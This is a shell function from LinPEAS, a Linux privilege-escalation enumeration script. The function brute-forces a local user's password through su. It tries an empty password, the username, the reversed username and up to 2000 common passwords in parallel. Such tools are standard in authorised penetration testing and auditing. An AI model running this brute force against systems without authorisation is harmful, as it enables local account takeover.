# Title: LinPeasBase - su_brute_user_num
# ID: su_brute_user_num
# Author: Carlos Polop
# Last Update: 22-08-2023
# Description: Brute force users with a list of passwords
# License: GNU GPL
# Version: 1.0
# Functions Used: su_try_pwd 
# Global Variables: $PASSWORD, $top2000pwds
# Initial Functions:
# Generated Global Variables: $BFUSER, $TRIES
# Fat linpeas: 0
# Small linpeas: 1


su_brute_user_num(){
  BFUSER=$1
  TRIES=$2
  su_try_pwd "$BFUSER" "" &    #Try without password
  su_try_pwd "$BFUSER" "$BFUSER" & #Try username as password
  su_try_pwd "$BFUSER" "$(echo $BFUSER | rev 2>/dev/null)" & #Try reverse username as password
  if [ "$PASSWORD" ]; then
    su_try_pwd "$BFUSER" "$PASSWORD" & #Try given password
  fi
  for i in $(seq "$TRIES"); do
    su_try_pwd "$BFUSER" "$(echo $top2000pwds | cut -d ' ' -f $i)" & #Try TOP TRIES of passwords (by default 2000)
    sleep 0.007 # To not overload the system
  done
  wait
}